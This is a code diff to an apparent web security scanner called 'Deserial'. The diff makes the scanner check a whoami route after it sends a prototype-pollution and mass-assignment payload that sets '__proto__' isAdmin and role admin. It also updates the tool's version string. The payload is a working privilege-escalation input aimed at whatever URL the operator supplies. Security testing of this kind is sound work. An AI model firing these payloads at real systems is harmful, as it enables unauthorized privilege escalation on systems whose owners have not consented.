@@ -23,7 +23,7 @@ import urllib.error
 import urllib.request
 
 sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
-from vibe_core import VibeTool
+from vibe_core import VibeTool, FRAMEWORK_VERSION
 from privacy_guard import privacy_user_agent
 
 DELAY = 5
@@ -92,10 +92,21 @@ class Deserial(VibeTool):
 
         # 3) Prototype pollution / mass assignment (JSON merge sinks)
         self._post(endpoint, {"__proto__": {"isAdmin": True}, "role": "admin", "isAdmin": True, field: base64.b64encode(b"x").decode()})
+        # If the operator gave us a whoami/profile route, actually check whether the
+        # pollution took effect instead of just reporting that we sent it.
         if whoami:
-            st, wb, _ = self._post(whoami, {}) if False else (0, "", 0)
-        # A follow-up whoami check is optional; report the attempt.
-        self.log("Sent __proto__/mass-assignment pollution payload — verify privileged state on a whoami/profile route.", "info")
+            st, wb, _ = self._post(whoami, {})
+            privileged = any(marker in (wb or "") for marker in ("isAdmin", "\"admin\"", "role"))
+            if st == 200 and privileged:
+                self.log(f"[POLLUTION PERSISTED] {whoami} reports privileged state after "
+                         f"__proto__/mass-assignment payload: {wb[:200]}", "hack")
+                self.findings += 1
+            else:
+                self.log("Sent __proto__/mass-assignment pollution payload — whoami route "
+                         "shows no privileged state change.", "info")
+        else:
+            self.log("Sent __proto__/mass-assignment pollution payload — pass --whoami to "
+                     "verify privileged state automatically.", "info")
 
         self.log("=" * 40)
         if self.findings:
@@ -111,7 +122,7 @@ def main(argv=None):
     p.add_argument("--endpoint", required=True, help="Endpoint that consumes serialized data, e.g. /api/session/load")
     p.add_argument("--field", default="data", help="JSON field carrying the serialized blob (default: data)")
     p.add_argument("--whoami", default="", help="Optional route to verify pollution (e.g. /api/whoami)")
-    p.add_argument("-v", "--version", action="version", version="Deserial 1.0.0")
+    p.add_argument("-v", "--version", action="version", version=f"Deserial {FRAMEWORK_VERSION}")
     args = p.parse_args(argv)
     return Deserial(args.url).run(args.endpoint, args.field, args.whoami)
 
